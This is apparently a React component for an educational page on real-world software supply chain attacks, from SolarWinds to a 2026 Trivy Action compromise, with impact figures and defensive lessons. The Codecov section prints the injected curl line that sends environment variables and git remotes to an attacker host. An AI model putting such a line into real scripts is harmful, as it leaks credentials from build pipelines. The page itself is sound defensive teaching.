import { useState } from 'react';
import { FiChevronDown } from 'react-icons/fi';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed" style={{ marginTop: '1rem' }}>
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const cases = [
  {
    year: 'December 2020',
    title: 'SolarWinds / SUNBURST',
    type: 'Build Process Compromise // T1195.002',
    impact: [
      { value: '18,000+', label: 'Orgs Affected' },
      { value: '~100', label: 'Actively Exploited' },
      { value: '9 mo', label: 'Undetected' },
      { value: '$B+', label: 'Cleanup Cost' },
    ],
    details: (
      <>
        <h4>What Happened</h4>
        <p>APT29 (Cozy Bear / Russian SVR) compromised SolarWinds' Orion build system. They implanted SUNSPOT malware that replaced a source file during compilation, injecting the SUNBURST backdoor into a legitimately signed update.</p>
        <h4>Technical Details</h4>
        <ul>
          <li>SUNSPOT monitored MsBuild.exe and swapped source files during compilation</li>
          <li>SUNBURST backdoor waited 12-14 days before activating</li>
          <li>Used Domain Generation Algorithm (DGA) for C2 communication</li>
          <li>C2 domains mimicked legitimate SolarWinds API traffic</li>
          <li>Selective targeting: only high-value orgs received second-stage payloads</li>
          <li>Compromised orgs include US Treasury, DHS, Microsoft, FireEye</li>
        </ul>
        <h4>How It Was Discovered</h4>
        <p>FireEye discovered it while investigating unauthorized access to their own Red Team tools. They traced the intrusion back to a trojanized SolarWinds Orion update.</p>

        <h4>Attack Flow Visualization</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'APT29', desc: 'Infiltrates build server', type: 'attacker', arrowType: 'danger' },
              { label: 'SUNSPOT', desc: 'Swaps source at compile', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Orion v2020.2.1', type: 'compromised', arrowType: 'danger' },
              { label: '18,000 Orgs', desc: 'Install trojanized update', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'Source code review is not enough — the malicious code was only present during compilation. Signing doesn\'t equal safety.',
  },
  {
    year: 'November 2018',
    title: 'event-stream / flatmap-stream',
    type: 'Compromised Package (Maintainer Takeover) // T1195.001',
    impact: [
      { value: '2M+', label: 'Weekly Downloads' },
      { value: '~2 mo', label: 'Undetected' },
      { value: 'BTC', label: 'Crypto Targeted' },
    ],
    details: (
      <>
        <h4>What Happened</h4>
        <p>The original maintainer of event-stream was burned out and handed over publishing rights to a stranger (right9ctrl). The attacker added a transitive dependency "flatmap-stream" containing encrypted malicious code.</p>
        <h4>Technical Details</h4>
        <ul>
          <li>Payload was AES-encrypted — static analysis couldn't read it</li>
          <li>Decryption key derived from Copay wallet's package description</li>
          <li>Code only activated when running inside the Copay Bitcoin wallet app</li>
          <li>Outside Copay, the code silently did nothing (avoiding detection)</li>
          <li>Malicious code was hidden in a test fixture file</li>
          <li>Intercepted wallet private keys during transaction signing</li>
        </ul>
        <h4>How It Was Discovered</h4>
        <p>Developer Ayrton Sparling (FallingSnow) noticed the unusual dependency while reviewing updates and raised a GitHub issue.</p>

        <h4>Attack Flow Visualization</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'right9ctrl', desc: 'Social engineers maintainer', type: 'attacker', arrowType: 'danger' },
              { label: 'event-stream', desc: 'Adds flatmap-stream dep', type: 'compromised', arrowType: 'danger' },
              { label: 'Copay Wallet', desc: 'AES payload activates', type: 'victim', arrowType: 'danger' },
              { label: 'BTC Stolen', desc: 'Private keys exfiltrated', type: 'attacker' },
            ]} />
          </div>
        </div>

        <YouTubeEmbed id="cvumD7bhLWU" caption="event-stream: Analysis of a compromised npm package" />
      </>
    ),
    lesson: 'Maintainer burnout is a security risk. Trust is transitive — trusting event-stream meant trusting flatmap-stream.',
  },
  {
    year: 'January – April 2021',
    title: 'Codecov Bash Uploader',
    type: 'CI/CD Pipeline Compromise // T1195.002',
    impact: [
      { value: '3 mo', label: 'Duration' },
      { value: '1000s', label: 'Orgs Affected' },
      { value: 'Keys', label: 'Secrets Leaked' },
    ],
    details: (
      <>
        <h4>What Happened</h4>
        <p>Attackers exploited a flaw in Codecov's Docker image creation to modify their Bash Uploader script. A single injected line exfiltrated ALL environment variables from every CI/CD pipeline using the script.</p>
        <h4>The Injected Line</h4>
        <ul>
          <li><code>curl -sm 0.5 -d "$(git remote -v){'<<<'}{'<<<'} ENV $(env)" http://attacker-ip/upload || true</code></li>
          <li>Collected git remote URLs and ALL environment variables</li>
          <li>Exfiltrated API keys, AWS credentials, npm tokens, database passwords</li>
          <li>The <code>|| true</code> ensured the pipeline continued normally</li>
        </ul>
        <h4>How It Was Discovered</h4>
        <p>A customer noticed the SHA-256 hash of the downloaded script didn't match the hash on Codecov's GitHub repository.</p>

        <h4>Attack Flow Visualization</h4>
        <div className="illustration" style={{ margin: '0.75rem 0' }}>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Exploits Docker flaw', type: 'attacker', arrowType: 'danger' },
              { label: 'Bash Uploader', desc: '+1 line of curl exfil', type: 'compromised', arrowType: 'danger' },
              { label: 'CI/CD Pipelines', desc: 'curl codecov.io/bash', type: 'victim', arrowType: 'danger' },
              { label: 'Secrets Leaked', desc: 'AWS, npm, DB tokens', type: 'attacker' },
            ]} />
          </div>
        </div>
      </>
    ),
    lesson: 'The "curl | bash" pattern is dangerous. CI/CD environments need secret minimization and integrity verification.',
  },
  {
    year: 'October 2024',
    title: 'Lottie Player (TryHackMe Lab)',
    type: 'Compromised Package (Token Theft) // T1195.001',
    impact: [
      { value: '1000s', label: 'Sites Affected' },
      { value: 'Crypto', label: 'Wallets Drained' },
      { value: 'Hours', label: 'To Detection' },
    ],
    details: (
      <>
        <h4>What Happened</h4>
        <p>An attacker stole an npm maintainer's access token for @lottiefiles/lottie-player and published malicious versions (2.0.5, 2.0.6, 2.0.7) that injected a cryptocurrency wallet drainer into every website using the library.</p>
        <h4>Technical Details</h4>
        <ul>
          <li>Malicious code injected a "Connect Wallet" popup overlay</li>
          <li>Supported MetaMask, Coinbase Wallet, and other providers</li>
          <li>Connected wallets were drained of all tokens and NFTs</li>
          <li>C2 server: <code>castleservices01[.]com</code></li>
          <li>Websites loading via CDN with <code>@latest</code> were auto-affected</li>
        </ul>
        <h4>This Is the TryHackMe Lab</h4>
        <p>This exact case is what you'll explore hands-on in the "Supply Chain Attack: Lottie" room on TryHackMe.</p>
      </>
    ),
    lesson: 'Never use @latest for CDN scripts. Use Subresource Integrity (SRI) hashes. Protect npm tokens with MFA.',
  },
  {
    year: 'March 2026',
    title: 'TeamPCP / Trivy Action',
    type: 'CI/CD + Cascading Supply Chain // T1195.001 + T1195.002',
    impact: [
      { value: '75/76', label: 'Tags Poisoned' },
      { value: '10K+', label: 'Workflows Hit' },
      { value: '∞', label: 'Blockchain C2' },
    ],
    details: (
      <>
        <h4>What Happened</h4>
        <p>Attackers compromised GitHub PATs and manipulated 75 of 76 version tags in aquasecurity/trivy-action, a widely-used security scanner. The poisoned action stole credentials from 10,000+ CI/CD workflows.</p>
        <h4>Technical Details</h4>
        <ul>
          <li>Trivy is a SECURITY SCANNER — irony of weaponizing a security tool</li>
          <li>Stole cloud credentials, SSH keys, npm/PyPI tokens</li>
          <li>Stolen npm tokens used to deploy CanisterWorm malware</li>
          <li>CanisterWorm uses blockchain-based C2 (commands stored on-chain)</li>
          <li>Cannot be taken down via domain seizure — decentralized and immutable</li>
        </ul>
        <h4>New Frontier: Blockchain C2</h4>
        <p>Traditional C2: seize domain, done. CanisterWorm C2: commands live on-chain forever. No single point of failure. Cannot be censored or taken down.</p>
      </>
    ),
    lesson: 'Pin GitHub Actions to commit SHAs, not tags. Even security tools can be weaponized. Blockchain C2 is the future threat.',
  },
];

function CaseCard({ c }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="timeline-item">
      <div className="timeline-dot" />
      <div className="timeline-year">{c.year}</div>
      <div className="case-card">
        <div className="case-card-header" onClick={() => setOpen(!open)}>
          <div>
            <h3>{c.title}</h3>
            <div className="case-type">{c.type}</div>
          </div>
          <button className={`case-card-toggle${open ? ' open' : ''}`}><FiChevronDown /></button>
        </div>
        {open && (
          <div className="case-card-body">
            <div className="impact-grid">
              {c.impact.map((m, i) => (
                <div className="impact-item" key={i}>
                  <span className="impact-value">{m.value}</span>
                  <span className="impact-label">{m.label}</span>
                </div>
              ))}
            </div>
            {c.details}
            <div className="case-lesson">
              <strong>Key Lesson</strong>
              <p>{c.lesson}</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function CaseStudies() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 2</div>
        <h1>Real-World Case Studies</h1>
        <p>Deep dives into landmark supply chain attacks from 2018 to 2026, with technical details, impact analysis, and key lessons.</p>
      </div>
      <div className="timeline">
        {cases.map((c, i) => <CaseCard key={i} c={c} />)}
      </div>

      <div className="media-section">
        <h2>Video Explainers</h2>
        <div className="video-grid">
          <YouTubeEmbed
            id="qmXcMACowR4"
            caption='The "Largest Supply Chain Attack Ever" — npm compromise (2025)'
          />
          <YouTubeEmbed
            id="QVqIx-Y8s-s"
            caption="The largest supply-chain attack ever — Fireship breakdown"
          />
        </div>
      </div>
    </div>
  );
}
